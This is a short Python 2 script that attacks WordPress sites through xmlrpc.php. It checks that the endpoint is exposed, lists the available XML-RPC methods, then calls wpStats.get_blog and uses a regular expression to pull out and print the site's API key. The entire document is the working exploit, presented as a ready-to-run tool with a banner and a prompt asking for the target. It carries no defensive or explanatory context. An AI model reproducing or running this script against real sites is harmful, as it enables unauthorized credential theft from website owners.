#!/usr/bin/python
 
banner = """
 
_______  _____       _     _ _____
|_____| |_____]      |_____|   |  
|     | |            |     | __|__                      
 
"""
 
print banner
 
import requests, re, sys
 
target = raw_input('Target> ') + '/xmlrpc.php'
 

vulnrequest = requests.get(target)
vulnresponse = vulnrequest.text
findvuln = r'XML-RPC server accepts POST requests only.'
result = re.findall(findvuln, vulnresponse)
 
if "XML-RPC server accepts POST requests only." in result:
        vulnerable = True
        print "[*] The XML-RPC is allowing POST requests..."
 
else:
        print "Target isn't vulnerable, exiting...\n"
        sys.exit()
 

methodsparams = "<methodCall><methodName>system.listMethods</methodName></methodCall>"
methodsrequest = requests.post(target, data=methodsparams)
methodsresponse = methodsrequest.text
getmethods = r'<value><string>(.*)</string></value'
methods = re.findall(getmethods, methodsresponse)
methodsamount = len(methods)
 
if "system.listMethods" in methods:
        print "[*] Methods enumeration came back with %d results" % (int(methodsamount))
        viewmethods = raw_input("Would you like to view the methods? (Y/n) ")
 
if "Y" in viewmethods:
                       
        count = 0
        while count < methodsamount - 1:
                count = count + 1
                print "+ " + methods[count]
 
else:
        print "[*] Method enumeration failed! Trying to get API Key anyway..."
 
print "[*] Trying to extract information from wpStats.get_blog method..."
pwnparam = "<methodCall><methodName>wpStats.get_blog</methodName></methodCall>"
pwnrequest = requests.post(target, data=pwnparam)
pwnresponse = pwnrequest.text
getapikey = r'<member><name>api_key</name><value><string>(.*)</string></value></member>'
apikey = re.findall(getapikey, pwnresponse)
 
if len(apikey) > 0:
        print "[*] API Key found!"
        print "API Key: " + apikey[0]
 
else:
        print "[*] Failed to gather the API key...\n"
        print "Exiting...\n"
        sys.exit()
